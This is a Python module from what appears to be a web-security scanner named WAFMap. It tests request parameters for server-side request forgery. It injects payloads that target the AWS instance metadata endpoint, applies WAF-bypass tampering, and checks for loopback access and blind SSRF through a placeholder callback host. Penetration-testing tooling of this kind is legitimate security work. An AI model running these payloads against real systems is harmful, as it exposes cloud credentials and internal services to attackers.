from .tampering import apply_tampering
import uuid

# URL AWS pour récupérer les métadonnées d'instance 
AWS_META = "http://169.254.169.254/latest/meta-data/"

def load_payloads_from_file(filename="payloads/ssrf.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except: return [AWS_META]

def run_ssrf_test(engine, injection_point, param_name, level, waf_bypass_enabled, waf_name=None):
    url = injection_point['url']
    method = injection_point['method']
    
    # Requête de référence pour comparer le contenu
    base_resp = engine._send_request(url, method=method)
    original_text = base_resp.text if base_resp else ""
    
    payloads = load_payloads_from_file()

    for payload in payloads:
        blind_id = None
        current_payload = payload
        
        # Gestion du Blind SSRF : génération d'un ID unique 
        if "SSRF_CALLBACK" in payload:
            blind_id = str(uuid.uuid4())[:8]
            # Simulation d'un serveur de callback (à remplacer par un vrai serveur collaborateur)
            current_payload = f"http://callback.wafmap.test/{blind_id}"

        final_payload = apply_tampering(current_payload, 'ssrf', waf_bypass_enabled, waf_name)
        
        data = {p: 'x' for p in injection_point['parameters']} if method == 'POST' else None
        params = {p: 'x' for p in injection_point['parameters']} if method == 'GET' else None
        
        if method == 'POST': data[param_name] = final_payload
        else: params[param_name] = final_payload

        resp = engine._send_request(url, method=method, data=data, params=params)
        
        if resp:
            # 1. Vérification spécifique AWS
            if AWS_META in current_payload:
                if "ami-id" in resp.text or "instance-id" in resp.text:
                    engine.add_vulnerability("SSRF (Cloud Leak)", url, final_payload, "AWS Data", parameter=param_name)
                    continue

            # 2. Vérification d'accès local
            if "Bienvenue sur le Lab WAFMap" in resp.text:
                if "Bienvenue sur le Lab WAFMap" not in original_text:
                    engine.add_vulnerability("SSRF (Loopback)", url, final_payload, "Accès interne", parameter=param_name)
                    continue
            
            # 3. Log pour le Blind SSRF (nécessite une vérification manuelle des logs du serveur callback)
            if blind_id and engine.config['verbose']:
                print(f"[INFO] Blind SSRF sent: {blind_id}")
